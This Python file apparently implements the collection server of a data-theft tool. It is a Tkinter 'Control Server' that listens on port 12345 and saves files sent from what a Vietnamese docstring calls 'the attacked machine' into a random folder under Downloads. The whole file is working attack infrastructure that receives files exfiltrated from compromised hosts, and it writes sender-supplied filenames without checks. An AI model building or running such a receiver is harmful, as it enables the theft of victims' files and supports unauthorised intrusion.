import socket
import threading
import json
import os
import random
import string
import tkinter as tk


class ControlServer:
    def __init__(self, host, port, update_log_callback):
        self.host = host
        self.port = port
        self.server = None
        self.update_log = update_log_callback
        self.current_session_directory = None

    def create_random_directory(self):
        """Tạo một thư mục mới với tên ngẫu nhiên để lưu file."""
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        random_folder = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        self.current_session_directory = os.path.join(downloads_path, random_folder)
        os.makedirs(self.current_session_directory, exist_ok=True)
        self.update_log(f"Created new directory for files: {self.current_session_directory}", "info")

    def save_file(self, filename, content):
        """Lưu file vào thư mục hiện tại."""
        if not self.current_session_directory:
            self.create_random_directory()

        file_path = os.path.join(self.current_session_directory, filename)
        with open(file_path, 'wb') as f:
            f.write(content)

        self.update_log(f"Saved file: {file_path}", "success")

    def handle_client(self, connection, address):
        """Xử lý mỗi kết nối từ máy bị tấn công."""
        self.update_log(f"Connection established from {address}", "info")
        try:
            data = b""
            while True:
                part = connection.recv(4096)
                if not part:
                    break
                data += part

            if data:
                message = json.loads(data.decode('latin1'))
                if 'filename' in message and 'content' in message:
                    self.save_file(message['filename'], message['content'].encode('latin1'))
                    self.update_log(f"File {message['filename']} received and saved.", "success")
                else:
                    self.update_log(f"Invalid message received from {address}.", "error")
        except Exception as e:
            self.update_log(f"Error handling client: {e}", "error")
        finally:
            connection.close()

    def start(self):
        """Bắt đầu server."""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.update_log(f"Server listening at {self.host}:{self.port}", "success")
        try:
            while True:
                connection, address = self.server.accept()
                threading.Thread(target=self.handle_client, args=(connection, address)).start()
        except OSError:
            self.update_log("Server stopped.", "error")
        finally:
            self.server.close()

    def stop(self):
        """Dừng server."""
        if self.server:
            self.server.close()
            self.update_log("Server stopped successfully!", "error")


class ServerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Control Server")
        self.master.geometry("600x400")
        self.server = None

        # GUI Components
        self.start_button = tk.Button(master, text="Start Server", command=self.start_server, bg="green", fg="white")
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(master, text="Stop Server", command=self.stop_server, bg="red", fg="white")
        self.stop_button.pack(pady=10)

        self.log_label = tk.Label(master, text="Server Logs", font=("Arial", 14))
        self.log_label.pack()

        self.log_text = tk.Text(master, height=15, width=70, state="disabled")
        self.log_text.pack(pady=10)

    def start_server(self):
        if not self.server:
            self.server = ControlServer('0.0.0.0', 12345, self.update_log)
            threading.Thread(target=self.server.start, daemon=True).start()
            self.update_log("Server started successfully.", "success")

    def stop_server(self):
        if self.server:
            self.server.stop()
            self.server = None

    def update_log(self, message, tag="info"):
        self.log_text.configure(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.configure(state="disabled")
        self.log_text.see(tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = ServerApp(root)
    root.mainloop()
